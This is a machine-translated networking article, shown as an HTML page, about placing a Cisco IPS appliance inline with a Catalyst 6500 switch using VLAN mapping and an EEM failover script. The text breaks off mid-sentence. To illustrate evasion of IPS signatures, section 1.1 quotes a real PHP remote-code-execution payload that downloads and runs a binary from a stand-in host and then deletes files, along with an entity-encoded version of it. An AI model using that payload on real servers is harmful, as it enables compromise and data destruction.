<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>We are on friendly terms with IPS Appliance and Multi-Layer Switch (Cisco IPS and Catalyst 6500)</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day to all! 
 In this article I would like to share my experience in one not very trivial question: how to connect a boxed IPS to a multi-level s...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>We are on friendly terms with IPS Appliance and Multi-Layer Switch (Cisco IPS and Catalyst 6500)</h1><div class="post__text post__text-html js-mediator-article">  Good day to all! <br>  In this article I would like to share my experience in one not very trivial question: how to connect a boxed IPS to a multi-level switch in Inline mode.  It will be about the ‚Äúiron‚Äù version of IPS in the form of applains (a separate box) and precisely about its Inline implementation.  The article is mainly focused on Cisco equipment: IPS 4510 and Catalyst 6500. <br><a name="habracut"></a><br><br>  The task, in terms of the implementation of best practices and recommended designs, would seem typical: in any whiten-security design, almost every functional segment of the campus network must be covered by the IPS system.  But in practice, the introduction of IPS in a segment, the core of which is implemented on the L3 switch, conceals a number of unobvious subtleties, tricks and pitfalls. <br>  The article is a description of the solution that has been developed, tested, implemented and has been successfully used for more than a year. <br><br>  In the course of the article I will go from simple to complex.  First, I will describe the general theory a bit, go over the principles of operation and methods for connecting IPS systems, and, of course, I will describe the scheme itself and give an example of the configuration. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h4>  <b>1) <u>General information about IPS</u></b> </h4><br>  Why do I need IPS by itself - it makes no sense to explain in detail.  Information on this subject is sufficient in the vastness of the web in abundance. <br>  Some of the principal points still worth listing: <br><br><h6>  1.1) <u>How does IPS work?</u> </h6><br>  Cisco has the following methods used to catch malicious traffic: <br><ul><li>  signature (search using regular expressions in L3 / L4 data, traffic correlation by the number of hits from / to one / multiple source / destination addresses, exceeding specified thresholds in a unit of time, searching for initially incorrect flags in headers, etc.) ; </li><li>  abnormal (comparison of current indicators with collected statistical values); </li><li>  "Cloud" (download data on the reputation of the source from external servers); </li></ul><br>  In Cisco, the main emphasis is placed on the signature engine, at which the IPS module needs to inspect each packet, check for ‚Äúcurves‚Äù of flags and values ‚Äã‚Äãin the fields.  If IP fragmentation took place, eliminate the data overlay, rebuild the TCP session, and move the content contained in it over a set of signatures. <br><br>  Also, the sensor needs to be able to interpret the data differently depending on their encoding. <br>  For example, an attacker wants to use a PHP vulnerability.  To do this, in the http request it puts in this payload: <br><pre> &lt;?  system ("cd / tmp; wget some.pwned-host.domain / seed.jpg; tar -xzvf seed.jpg; chmod + x seed; ./seed; rm -rf *");  ?&gt;
</pre><br>  Such a payload in ‚Äúpure‚Äù (ASCII) form will catch the signature.  But if this request is converted, say, to UNICODE, the string will take the form <br><pre> &amp; #! 060; &amp; #! 063; &amp; #! 032; &amp; #! 115; &amp; #! 121; &amp; #! 115; &amp; #! 116; &amp; #! 101; &amp; #! 109; &amp; #! 040; &amp; #! 034; &amp; #! 099; &amp; #! 100; &amp; #! 032; &amp; #! 047; &amp; #! 116; &amp; #! 109; &amp; #! 112; &amp; #! 032; &amp; #! 059; &amp; #! 032; &amp; #! 119; &amp; #! 103; &amp; #! 101; &amp; #! 116; &amp; #! 032; &amp; #! 115; &amp; #! 111; &amp; #! 109; &amp; #! 101; &amp; #! 046; &amp; #! 112; &amp; #! 119; &amp; #! 110; &amp; #! 101; &amp; #! 100; &amp; #! 045; &amp; #! 104; &amp; #! 111; &amp; #! 115; &amp; #! 116; &amp; #! 046; &amp; #! 100; &amp; #! 111; &amp; #! 109; &amp; #! 097; &amp; #! 105; &amp; #! 110; &amp; #! 047; &amp; #! 115; &amp; #! 101; &amp; #! 101; &amp; #! 100; &amp; #! 046; &amp; #! 106; &amp; #! 112; &amp; #! 103; &amp; #! 032; &amp; #! 059; &amp; #! 032; &amp; #! 116; &amp; #! 097; &amp; #! 114; &amp; #! 032; &amp; #! 045; &amp; #! 120; &amp; #! 122; &amp; #! 118; &amp; #! 102; &amp; #! 032; &amp; #! 115; &amp; #! 101; &amp; #! 101; &amp; #! 100; &amp; #! 046; &amp; #! 106; &amp; #! 112; &amp; #! 103; &amp; #! 032; &amp; #! 059; &amp; #! 032; &amp; #! 099; &amp; #! 104; &amp; #! 109; &amp; #! 111; &amp; #! 100; &amp; #! 032; &amp; #! 043; &amp; #! 120; &amp; #! 032; &amp; #! 115; &amp; #! 101; &amp; #! 101; &amp; #! 100; &amp; #! 032; &amp; #! 059; &amp; #! 032; &amp; #! 046; &amp; #! 047; &amp; #! 115; &amp; #! 101; &amp; #! 101; &amp; #! 100; &amp; #! 032; &amp; #! 032; &amp; #! 059; &amp; #! 032; &amp; #! 114; &amp; #! 109; &amp; #! 032; &amp; #! 045; &amp; #! 114; &amp; #! 102; &amp; #! 032; &amp; #! 042; &amp; #! 032; &amp; #! 034; &amp; #! 041; &amp; #! 059; &amp; #! 032; &amp; #! 063; &amp; #! 062;
</pre><br>  and will not be detected by regexp in the signature.  However, the web server itself quite ‚Äúsuccessfully‚Äù eats it, interprets it and - specifically in this case, will become part of the botnet (the request is taken from a real ‚Äúremote code execution‚Äù attack). <br><div class="spoiler">  <b class="spoiler_title">ASCII to UNICODE Translation</b> <div class="spoiler_text">  The transformed text had to add the character "!"  after the grid, because  Habr engine also successfully UNICODE eats and translates into source code. <br></div></div><br><br><h6>  1.2) <u>IPS Connection Approaches</u> </h6><br>  There are only two of them in general: <br><br>  <i>A) Promiscuous / Mirroring / "Sideways"</i> <br>  The main idea of ‚Äã‚Äãthis approach is that IPS stands next to the network, does not affect its throughput in any way and receives a copy of the traffic from which it subsequently tries to restore the original sessions and run through them with its own set of signatures. <br><br>  Pros: <br><ol><li>  It does not create bottlenecks (IPS sensors vary greatly in performance, so bandwidth is one of the main criteria for their selection).  Those.  if in the Promisc mode some fragment of the TCP session did not hit the sensor, say, due to the overload of the SPAN port (the mirrored port that takes a copy of the traffic for IPS), then the worst thing that can happen is that we will not detect a possible attack. . </li><li>  In case of IPS failure, there will be no consequences for the network. </li></ol><br>  Minuses: <br><ol><li>  Since there is no direct impact on traffic, functions such as normalization and de-obfuscation will not be available, which is fraught with False Negative (an attack is not detected).  Normalization mainly allows detecting attacks that can be masked at 3rd or 4th level: due to bit offset flags during IP fragmentation, sending a TCP segment with zero TTL or a check-sum curve.  The sensor, receiving a copy of the traffic, tries to reassemble it (put the IP fragments together and restore the TCP session) in order to understand how the traffic will be interpreted on the final host.  In promisc mode, you can only specify for which operating system to attempt to model IP ressambley. </li><li>  Preventive actions (blocking malicious traffic) can only be ‚Äúpursued‚Äù by sending the appropriate commands to upstream gateways / firewalls.  If the ‚Äúbad‚Äù package reached its goal earlier than the blocking directive - alas. </li></ol><br><br>  <i>B) inline / break</i> <br>  In this approach, it is assumed that the sensor is directly in the path of traffic.  At the same time, IPS has the opportunity to directly influence transit traffic: <br>  - provide normalization by checking and discarding packets and segments / datagrams that have ‚Äúcurved‚Äù fields <br>  - check checksum and various values ‚Äã‚Äãin TCP headers, discard or correct incorrect segments <br>  - eliminate data overlays during fragmentation even before these data reach the final goal <br>  - correctly build the order of sessions to analyze the content <br>  - block attacks when signatures are triggered. <br>  Those.  in fact, this mode is the preferred option, in which one can expect the greatest return from IPS. <br>  If we talk about AIP-SSM IPS modules embedded in ASA, or NME / AIM-IPS modules (they already have EOL), embedded in ISR platforms, or even IOS-IPS software solution - the implementation of Inline mode in this case is quite simple because  Most often, these devices are already on the path of traffic.  But if we talk about applains - here everything is somewhat more complicated. <br><br>  Pros: <br><ol><li>  Ability to use a variety of mechanisms to identify disguised attacks. </li><li>  The ability to directly block malicious traffic (here, though many people have a panic fear that IPS will block the work of legitimate applications). </li></ol><br>  Minuses: <br><ol><li>  IPS becomes a bottleneck.  Accordingly, if it is ‚Äúoverloaded‚Äù in terms of the amount of traffic, this already has a direct impact on the operation of the network.  If any of the fragments of the TCP session did not reach the sensor, it will be discarded, and the hosts that participated in the session will receive a session timeout.  If the sensor "dies" - in general, the traffic in general already does not go anywhere else.  Fortunately - the attacks also will not pass.  How to live with it and what to do - will be described in a separate section ‚ÄúFault tolerance‚Äù. </li><li>  With incorrect / inadequate configuration of signatures and exceptions - false positive responses can really cause problems. </li></ol><br><br><h6>  1.3) <u>How IPS-modules behave from the point of view of network equipment</u> </h6><br>  If we consider IPS as network equipment, then we need to perceive it as something between a wire (more precisely, a ‚Äúsmart‚Äù wire) and a bridge: <br><ul><li>  IPS applains interfaces successfully negotiate duplexing and speed; </li><li>  skip all L2 frames (including BPDUs).  The only option is to (not) filter the CDP; </li><li>  IPS "understands" VLAN-ID; </li><li>  the only operation not related to blocking / normalization that IPS with traffic can perform is to replace the VLAN-ID and only in the VLAN-pair mode (the mode will be discussed later); </li><li>  IPS does not know how to route.  For equipment to which the IPS is connected, this is just a wire; </li><li>  in the Inline-mode, traffic received on the interfaces, IPS sends (after analysis) further to the ‚Äúpaired‚Äù interfaces; </li><li>  tracking TCP sessions and choosing a particular Virtual-Sensor for analysis depends on the settings: the recommended (and default) mode for Inline TCP session tracking mode: Virtual Sensor.  Those.  if separate segments from the same TCP session arrive on different physical IPS interfaces, they will still be ‚Äúcollected‚Äù and sent for analysis to the selected Virtual Sensor; </li><li>  IPS can reassemble TCP sessions (in the case of Promisc-mode) or normalize them (in the case of Inline-mode) in two modes: Strict and Asymmetric (for Promisc mode there is also an additional Loose mode).  <u>For an adequate IPS operation, you only need to use Strict mode: i.e.</u>  <u>the entire TCP session must go through the sensor in both directions.</u>  <u>All other modes actually reduce the meaning of IPS work to zero.</u> </li><li>  if, for any reason, in Inline + Strict-IPS mode (physical interface overload or lack of memory in the Analysis Engine) missed at least one fragment of the TCP session, all subsequent fragments of this session will be discarded. </li><li>  individual IPS-boxes / modules do not have any protocols / tools for transferring information about current sessions (aka statefull redundancy).  Those.  in the case of using multiple sensors, traffic from any host to another should always go through only one sensor. </li></ul><br><br><h4>  <b>2) <u>INLINE implementation methods</u></b> </h4><br>  I hope that in the previous part of the article I was able to explain that in order for IPS to work effectively, it is necessary to turn it on in Inline mode and to ensure symmetric traffic routing through it. <br>  Now we list inline connectivity options that are supported by Cisco sensors, and look at the scenarios that are provided in the official documentation.  When considering the scenarios, I deliberately give them exactly in the form in which they are presented in the Tsiskovskoy documentation.  In the part specifically devoted to my scenario, I will explain what Cisco actually meant. <br><br><h6>  2.1) <u>Inline Interface Pair Mode</u> </h6><br>  Here are the scenarios for the use of this mode are described in the official literature: <br><br>  <i>A) IPS connects two physically separated segments</i> <br><img src="https://habrastorage.org/getpro/habr/post_images/e31/ced/e54/e31cede54ee563da1d2929baf49558ae.png"><br>  It's all clear.  There are two L3 switches, each of which performs Inter-vlan routing for connected networks.  Traffic to networks that are behind another L3 switch will pass through IPS. <br><br>  <i>B) IPS connects two VLANs</i> <br><img src="https://habrastorage.org/getpro/habr/post_images/245/555/7b5/2455557b585b1f36e74184b697550546.png"><br>  Here is a more interesting situation: two VLANs on one physical switch are combined using an IPS sensor.  When I saw this scheme, the first question I had was: why should the traffic from VLAN10 go to VLAN11 through IPS itself?  The answer to this question will be given later. <br><br><h6>  2.2) <u>Inline VLAN Pair Mode</u> </h6><br>  The next inline mode in which sensors can work is VLAN Pair.  It is also called "IPS on a stick."  In this mode, the IPS interface (s) operate in the 802.11q Trunk mode.  The same IPS interface receives tagged traffic from the same VLAN, IPS analyzes this traffic, replaces the VLAN-ID tag in the frame and sends this frame back through the same port.  It is worth noting that the traffic sent from one VLAN to another passes through one physical interface twice, so the actual bandwidth of this interface is halved.  Also, in fact, this is the only mode in which the sensor independently modifies the traffic, not related to its blocking and normalization. <br><img src="https://habrastorage.org/getpro/habr/post_images/70d/fd9/a3b/70dfd9a3b5c700a1316833884d407a5d.png"><br>  As in the previous scenario, a reasonable question arises: what actually will force traffic from VLAN11 to go to VLAN12 through IPS?  The answer to this and previous questions will be later. <br><br><h6>  2.3) <u>Inline VLAN Group Mode</u> </h6><br>  Well, the last of the existing Inline modes - VLAN Group Mode.  The general idea is exactly the same as in the case of the Interface-pair: the physical interfaces of IPS are combined in pairs.  After that, on each pair of interfaces, a ‚Äúsub-pair‚Äù of interfaces is created (by analogy with sub-interfaces on routers) and VLAN-tags are assigned to it, which correspond to this sub-pair.  The meaning of this construction is to be able to assign different VLANs to different virtual sensors (each virtual sensor has its own set of signatures, the Anomaly Detection statistical base and the traffic exclusion / blocking policy).  Accordingly, when using this mode, tagged traffic should be sent to the IPS interface. <br>  The scenario provided in the documentation assumes that the same networks exist on two different switches that are connected via IPS: <br><img src="https://habrastorage.org/getpro/habr/post_images/39d/3bf/06d/39d3bf06d79a2ccd3dec26dc9cc020dd.png"><br>  Immediately I will explain that there is no confusion with the previous mode: the traffic sent from VLAN11 from the left switch to the host in the same VLAN11 physically located behind the right switch will go through IPS.  This traffic will not fall into any other VLANs.  The main objective of this mode is to provide flexibility in the set of signatures for different networks.  For example: telephony lives in VLAN11, and mail servers in VLAN12.  We assign VLAN11 to the virtual sensor vs0, and VLAN12 to vs1.  On vs0 we include signatures that are relevant for UC / VoIP attacks and write the appropriate exceptions, and on vs1 - the same for E-Mail attacks, respectively. <br><div class="spoiler">  <b class="spoiler_title">If you still do not understand the meaning of the regime</b> <div class="spoiler_text">  When I first tried to understand the meaning of this mode - I read 10 times its descriptions in the Configuration Guide, in the Official Certification Guide, and also in the presentations of the official IPS course.  I did not understand it until I set it up with my hands :) In the part on the configuration, I will give an example of how to configure this mode. </div></div><br><br><h4>  <b>3) <u>Problem statement</u></b> </h4><br>  Now that the main theoretical points and the proposed scenarios are outlined (although not yet fully understood), it is time to get a little closer to a more vital scenario. <br><br>  <i>Given:</i> <br>  Catalyst 6500 - 1 pc. <br>  IPS 4510 -1 pc.  (10 physical interfaces, no hardware-bypass function). <br>  Server / service VLANs (many) and user (even more) are connected to the 6500.  6500 is the core of the network and carries out the routing m / v VLAN-s.  For each VLAN on the 6500, a corresponding SVI was created, which is the default gateway for each network. <br><br>  <i>Task:</i> <br>  ‚ÄúWrap‚Äù IPS traffic as it passes from user networks to server networks (i.e., to effectively protect server segments).  In this case, in the event of an IPS failure, it is necessary to ensure the possibility of returning to ‚Äúnormal‚Äù direct routing (aka fail-open mode on the ASA). <br><img src="https://habrastorage.org/getpro/habr/post_images/5c4/89b/4fd/5c489b4fdf1ffd34138bebdeeb56c584.png"><br><br><h4>  <b>4) <u>Step by step description of the solution</u></b> </h4><br>  This is where the fun begins.  Let's try to understand how the approaches proposed by Cisco actually work, and also find out how to apply them for the task described above. <br><br><h6>  4.1) <u>How inline modes actually work</u> </h6><br>  In clauses 2.1) b) and 2.2) I left one unholy question.  It's time to give an answer. <br>  One of the non-trivial moments to be reconciled with is the refutation of the truth ‚Äú1 VLAN = 1 subnet‚Äù.  In the context of IPS connectivity, this axiom has to be destroyed and force itself to live with the new state of affairs. <br>  The general idea of ‚Äã‚Äãthe approach is to bring the default gateway address to another VLAN.  At the same time, the source VLAN should remain without SVI, i.e.  the switch in the source VLAN should work only at the second level. <br>  Below I will give an illustration that I personally did not have at the time when I was just beginning to dive into this question. <br><br>  First, consider the principle of operation of the L3 switch under ‚Äúnormal‚Äù conditions: i.e.  Gi0 / 2 and Gi0 / 20 ports are in switchport mode access mode in the advancing VLANs and for each VLAN a corresponding SVI is created: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/b2a/a4a/bed/b2aa4abed4a69c066e206d858434bad7.png"><br><br>  When the interface with the VLAN number is created on the L3 switch, we actually connect the virtual router inside the switch with the virtual L3 interface to this VLAN.  At the same time, on the L3 switch, when setting the address on the SVI, this network appears as a connected route.  Accordingly, the logic of the switch at each incoming in this VLAN-e frame looks like this: <br><blockquote>  If the dst mac of the incoming frame matches the mac-address of my SVI, discard the header and trailer of this frame, and route the remaining L3PDU.  In other cases - continue switching. </blockquote><br>  Accordingly, if a certain host with IP 10.2.0.1 and mac 0002.0000.0001 from VLAN2 sends an ICMP packet to a host with IP 10.20.0.1 and mac 0020.0000.0001 to VLAN20, then it will look like this: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/490/9c1/5fa/4909c15fa671a8a547044bc61ceee3c3.png"><br><br>  And now let's analyze the situation when in VLAN20 we delete SVI and create with the same IP address (which is the default gateway for the network 10.20.0.0/24) a new one, but already in VLAN 120. At the same time, the access port in VLAN120 will be connected to one of the ports of the IPS-sensor, and the twin port will be connected already in VLAN20: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/715/06e/c0d/71506ec0de7080bbed28eb676d948b1c.png"><br><br>  If we again consider sending an ICMP packet from a conditional host with IP 10.2.0.1 and mac 0002.0000.0001 from VLAN2 to a conditional host with IP 10.20.0.1 and mac 0020.0000.0001 in VLAN20, the following will happen: <br><ol><li>  Host 10.2.0.1 sends an ARP request to find out the mac-address of its default-gw and receives a response from SVI VLAN2. </li><li>  The host forms a frame with src mac 0002.0000.0001, dst mac 0002.0000.0254, with the src ip 10.2.0.1 packet, dst ip 10.20.0.1 and sends to the G0 / 2 interface. </li><li>  Having received the frame on the access port in VLAN2, with the mac-address corresponding to the SVI mac address in this VLAN, the 6500 discards the L2 header and trailer, looks at the src ip and looks for an entry in the routing table. </li><li>  Since now the SVI with the address from the destination network is in VLAN120, the 10.20.0.0/24 network is connected in this VLANe.  From the SVI VLAN 120 a broadcast ARP request is sent.  Since the only port connected to this VLAN is Gi0 / 48, the frame only goes to it. </li><li>  The ARP request goes through IPS and gets on port Gi0 / 47, but already in VLAN20.  The switch forwards the broadcast frame to all ports in this VLAN - i.e.  on gi0 / 20 </li><li>  The ARP response from the conditional host 10.20.0.1 proceeds in the same way as in clauses 4-5, but in reverse order. </li><li>  In the switching table for VLAN20, the mac-address 0020.0000.0254 (SVI VLAN120) starts to be registered on port Gi0 / 47, and for VLAN120 the mac-address 0020.0000.0001 (host 10.20.0.1) starts to be registered on port Gi0 / 48.  On the same port (Gi0 / 48) for VLAN120 there will be records of all other hosts from the 10.20.0.0/24 network. </li><li>  6500 forms a new frame with src mac 0020.0000.0254, dst mac 0020.0000.0001 and inserts L3PDU with src ip 10.2.0.1 and dst ip 10.20.0.1 into it. </li><li>  Further, the frame is switched in the same way as in points 4-5. </li><li>  An ICMP reply follows the same path, but in reverse order. </li></ol><br>  In fact, after removing SVI VLAN20, this entire VLAN20 becomes a regular L2 broadcast domain.  Those.  all frames coming into this VLAN are only COMMUTED according to the switching table.  By the way - in fact, all SVIs have the same mac-address by default (in the diagram I changed it for clarity).  <u>Therefore, SVI needs to be deleted with the command no interface vlan &lt;vlan-id&gt;.</u>  Simply removing the ip address for this SVI is not enough, since  The 6500 will continue to route responses coming from VLAN20.  As a result, we get an asymmetric path - and as a result, IPS will reset TCP sessions. <br><br>  All the trick is possible thanks to the fact that IPS creates a physical bridge between two different VLANs, through access ports 6500. <br>  In the case of using the VLAN-pair mode, the same thing happens, the only difference is that the IPS is connected via the TRUNK port where both VLANs are forwarded at once.  At the same time, IPS, upon receiving a frame, gives it back, replacing the VLAN tag.  Those.  each frame is sent twice through the same interface, reducing the actual port throughput by half.  However, the main problem in the case of using the VLAN-pair is fault tolerance: if the IPS fails, further traffic movement will be impossible, since  There will be no one to replace the VLAN-tag.  That is why this mode will not be considered for solving the problem.  But one key point from him will still be borrowed. <br><br><h6>  4.2) <u>Putting it all together</u> </h6><br>  Having figured out how the principle of establishing a VLAN in the Inline of one VLAN, the following problem immediately arises: if you spend two physical interfaces to unify the ‚Äúremote‚Äù SVI, then you will not get many IPS networks.  The VLAN-pair mode is also not suitable due to the limitations associated with fault tolerance. <br><br>  Well, if you are closer to real conditions, then server and user networks often also come to the core through trunk channels.  Those.  the task actually looks like this: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/6ab/03c/c12/6ab03cc12037cd984e8a21f27377c168.png"><br><br>  In fact, the main question is how to build a bridge between two TRUNK ports, and even so that traffic to certain subnetworks is first ‚Äúspat out‚Äù, then returned with the already modified VLAN tag.  Moreover, the VLAN-tag should not be changed by IPS, since  this will put an end to fault tolerance in the event of an IPS failure. <br><br>  The answer was: <b>vlan mapping</b> . <br>  This technology is quite specific and is supported exclusively on ‚Äúthick‚Äù platforms like Catalyst 6500. Its essence is as follows - vlan mapping is enabled on TRUNK ports and allows changing the VLAN-ID number in it when passing a frame.  And the mapping takes place in both directions.  Thus, for the scheme above, it is necessary to ensure the replacement of VLAN tag frames with 120, 130, 140 by 20, 30, 40, respectively, outgoing from the port of Gi0 / 48.  And vice versa. <br><br>  Generally speaking, with vlan mapping, you need to be extremely careful, because  with incorrect settings, it is quite easy to make loops of the second level.  It is enabled on the 6500 using the <b>switchport vlan mapping enable</b> command in the interface configuration mode.  The mapping itself is configured by the <b>switchport</b> command <b>vlan mapping <i>&lt;external-vlan&gt; &lt;internal-vlan&gt;</i></b> .  What is interesting is that when you configure the mapping rule on one port, it is added immediately to a group of ports that are controlled by one ASIC processor.  But it becomes active only on the ports transferred to the <b>trunk</b> mode and on which the <b>switchport vlan mapping enable</b> command was entered.  In view of this peculiarity, it is necessary to properly select the ports, if to provide communication with IPS via etherchannel: all members of the aggregated channel must have identical settings.  Vlan-mapping is configured exclusively on physical ports. <br>  Actually in the final we get this picture: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/4b1/d51/2a3/4b1d512a39a19dc86d30d0371268b922.png"><br><br>  Accordingly, all communications within VLANs 20, 30, 40 pass without the participation of IPS.  As soon as traffic from / to these subnets requires the participation of the Default-gateway-I, it will go through IPS.  Instead of interfaces Gi0 / 48 and Gi0 / 47, there may be etherchannels (in my battle scheme, they are the ones that are used).  In principle, nothing changes - you only need to carefully configure the VLAN-mapping. <br>  For an institution in IPS of a new subnet, the algorithm of actions is as follows: <br><ol><li>  Remove the existing SVI with the <b>no interface vlan &lt;vlan-id&gt;</b> command. </li><li>  We create SVI with the same ip, but in a different VLAN. </li><li>  Configure for Gi0 / 48 mapping <b>switchport vlan mapping <i>&lt;native-vlan&gt; &lt;new vlan SVI&gt;</i></b> . </li><li>  We add on Gi0 / 48 new vlan in a trunk. </li><li>  We add on Gi0 / 47 old vlan to the trunk. </li></ol><br>  It should be remembered that in the newly created VLAN there should be nothing but SVI! <br><br><h6>  4.3) <u>Fault tolerance</u> </h6><br>  The last stage of the 6500 setup will be the implementation of the function of ‚Äúshooting off‚Äù the IPS-box, in case of its (IPS) failure. <br>  Generally speaking, there are two fault tolerance features in IPS: <br><ol><li>  Software Bypass, which, in the event of the main sensor application crashing, must ensure that the packets pass through the paired interfaces without their inspection.  If the sensor is turned off or its OS completely freezes, this mode will not help much.  Also, practice has shown that in some circumstances, the sensor may hang so that the Bypass function itself stops working ... </li><li>  Hardware bypass, which is available only on individual network expansion cards for older models, which now have come EOL.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For the new series (45xx and 43xx) there are no such boards yet. </font><font style="vertical-align: inherit;">The meaning of this function is that even when the power is turned off on certain pairs of interfaces, there is a physical closure of the contacts.</font></font> Those.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> traffic continues its way through the wire. </font></font></li></ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And the first and second options when using VLAN-Pair will not work, in fact, therefore, this mode was not considered. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In order to perform the ‚Äúfault-tolerant‚Äù part of the task, an EMM script was implemented in the presented scheme. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The general idea is as follows: if any of the ports that are looking at IPS go to the LINEPROTO-5-UPDOW down status, then you must delete all the created SVIs for the protected networks and recreate them with the same address in their native VLAN . </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">For the scheme above, it will look something like this:</font></font><br><blockquote> event manager applet 48-47 <br> event syslog pattern ".*LINEPROTO-5-UPDOWN.* GigabitEthernet0/48.* changed state to down" <br> action 1.1 cli command ¬´enable¬ª <br> action 1.2 cli command ¬´conf t¬ª <br> action 1.3 cli command ¬´int GigabitEthernet0/47¬ª <br> action 1.4 cli command ¬´sh¬ª <br> action 1.8 syslog msg ¬´PORT 48 FAILED!¬ª <br> event manager applet IPS_DOWN <br> event syslog pattern ".*LINEPROTO-5-UPDOWN.* GigabitEthernet0/47.* changed state to down" <br> action 1.1 cli command ¬´enable¬ª <br> action 1.2 cli command ¬´conf t¬ª <br> action 2.1 cli command ¬´no int vlan 120¬ª <br> action 2.2 cli command ¬´int vlan 20¬ª <br> action 2.3 cli command ¬´ip add 10.20.0.254 255.255.255.0¬ª <br> action 3.1 cli command ¬´no int vlan 130¬ª <br> action 3.2 cli command ¬´int vlan 30¬ª <br> action 3.3 cli command ¬´ip add 10.30.0.254 255.255.255.0¬ª <br> action 4.1 cli command ¬´no int vlan 140¬ª <br> action 4.2 cli command ¬´int vlan 40¬ª <br> action 4.3 cli command ¬´ip add 10.40.0.254 255.255.255.0¬ª <br> action 10.1 syslog msg ¬´IPS FAILED!¬ª <br></blockquote><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Specifically, in my case, the firmware on the Supervisor 6500 12.2 (33) SXH8b was used, so it was not possible for EMM to become attached to the track or track-list object. Because of this, it was necessary to catch patterns from syslog-messages. The target ports also need to enter the </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">logging event link-status</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> command </font><font style="vertical-align: inherit;">. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If etherchannel is used to connect to IPS, one detail must also be taken into account: at the second level, the 6500 will build the etherchannel with itself, but at the first level, the links will go directly to the IPS interfaces. Therefore, ports 6500 must be ‚Äúextinguished‚Äù in pairs (by analogy, as was done in the example of Gi0 / 48). ‚ÄúTo extinguish‚Äù in pairs means that the 6500 interfaces that are connected via the Interface-pair on IPS must be turned off simultaneously.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">That is, if we have, for example, a connection implemented like this: </font></font><br><br><img src="https://habrastorage.org/getpro/habr/post_images/0df/a28/cbe/0dfa28cbe8222b6781e6d6b1c0b74004.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Then in the EMM you need to monitor the state of Gi0 / 48, and in the event of a fall, put out the Gi0 / 38. And vice versa - when Gi0 / 38 is dropped - extinguish Gi0 / 48 (and so on - for each pair of interfaces). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If this is not done, a situation may arise when, for example, when one of the ports burns out at 6500 in the first channel-group, it leaves its structure, but the return port will still be in the UP state (since it will remain connected to IPS). In such a situation, etherchannel will send traffic from one side, but it will not go anywhere ...</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And the last point that I would like to mention is that, in addition to physically disconnecting IPS, there is a possibility of a software failure, in which IPS will not pass traffic through itself, but the ports will be kept up / up. </font><font style="vertical-align: inherit;">To avoid such a situation, it is better to create a track-list, where, in addition to the state of the interfaces, you should also monitor something for IPS (do ip sla on the svi and ip sla responder side for ips, either track some resource or check icmp IPS management interface).</font></font><br><br><h4> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5) </font></font><u><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Setup on the IPS side</font></font></u></b> </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To complete the picture I will describe the possible settings for the IPS-box itself. </font><font style="vertical-align: inherit;">In principle, in the scheme described above, on the IPS side, you can use the Interface-pair mode.</font></font> Those.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">just pair the ports to which the 6500 is connected and send everything to one virtual sensor. </font><font style="vertical-align: inherit;">However, the presence of VLAN-tags allows you to make a more selective check. </font><font style="vertical-align: inherit;">Although the above connection scheme is a kind of hybrid 